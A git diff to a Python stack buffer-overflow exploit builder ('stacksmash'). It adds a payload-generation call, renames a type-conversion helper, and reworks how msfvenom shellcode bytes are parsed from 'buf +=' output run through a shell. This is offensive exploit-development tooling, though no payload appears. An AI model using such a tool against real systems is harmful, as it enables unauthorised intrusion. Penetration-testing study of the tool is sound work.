@@ -106,6 +106,7 @@ class exploit:
         default = f"{os.getcwd()}/stacksmash"
         path = get_filepath(
             "where you'd like to save your settings", default=default)
+        self.payload_generator(buffer_size=self.buffer_size,target_eip=self.target_eip)
         with open(path, "w") as file:
             file.write(str(self))
         clear_screen()
@@ -126,7 +127,7 @@ class exploit:
         for line in lines:
             if re.search(r'".+" : ".+"', line):
                 words = line.split("\"")
-                file_key, file_val = words[1], get_intended_type(words[3])
+                file_key, file_val = words[1], translate_type(words[3])
                 for key in list(self.__dict__.keys()):
                     if key == file_key:
                         setattr(self, key, file_val)
@@ -664,11 +665,12 @@ def get_venom(payload, args, bad_chars):
 
     output = subprocess.check_output(
         cmd_string, shell=True, universal_newlines=True)
-    venom = [line for line in output.split("\n") if "buf +=" in line]
-    for line in venom:
-        i = line.find("\"")
-        line = line[i+1:line.find("\"", i+1)]
-    venom = "".join(venom)
+    lines = [line for line in output.split("\n") if "buf +=" in line]
+    out = []
+    for line in lines:
+        if re.search(r"[\'|\"].+[\'|\"]",line):
+            out.append(re.search(r"[\'|\"].+[\'|\"]",line)[0][1:-1])
+    venom = "".join(out)
     venom = venom.replace("\\x", "")
     return venom
 
@@ -714,7 +716,7 @@ def change_setting(exp):
                               "Enter the new value for this setting:\n").strip()
             if check_input():
                 break
-        exp.__setattr__(keylist[choice], get_intended_type(user_inpt))
+        exp.__setattr__(keylist[choice], translate_type(user_inpt))
 
 
 def exploit_handler(exp):
@@ -804,7 +806,7 @@ def check_input():
     return yn_key[get_input("\n#|| Does your input look correct? ([y]/n):\n", ["y", "n", ""], default="y")]
 
 
-def get_intended_type(string):
+def translate_type(string):
     """
     Takes a string, returns the intended value/data type. Used for reading in a settings file
     """
